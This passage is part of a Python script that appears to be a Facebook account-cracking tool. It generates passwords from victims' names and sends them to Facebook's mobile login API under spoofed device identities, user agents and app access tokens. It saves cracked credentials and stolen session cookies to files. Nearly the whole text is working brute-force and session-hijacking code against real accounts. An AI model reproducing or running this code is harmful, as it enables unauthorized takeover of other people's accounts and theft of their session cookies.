                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers={'User-Agent':aqib_ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;uid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ASIF-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SILENT-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SILENT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ASIF-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ASIF] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SILENT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SILENT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ASIF SAKHANI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/362.0.0.39.122;FBBV/103340811;[FBAN/FB4A;FBAV/362.0.0.39.122;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103340811;FBCR/Airtel;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': aqib_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;uid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ASIF SAKHANI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SILENT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SILENT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ASIF-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[38;5;205m [ERROR] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SILENT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SILENT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def uidm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ASIF SAKHANI] %s|\033[1;32mOK:-%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/362.0.0.39.122;FBBV/103340811;[FBAN/FB4A;FBAV/362.0.0.39.122;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103340811;FBCR/Airtel;FBMF/;FBBD/Infinix;FBDV/Infinix X688B;FBSV/7.1.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,height=,width=;FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':aqib_ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ASIF SAKHANI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;96mCookie: "+coki)
                                        open('/sdcard/SILENT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SILENT-uid-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                      #  print('\r\r\x1b[38;5;205m [ERROR] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SILENT-uid-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
                        
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
        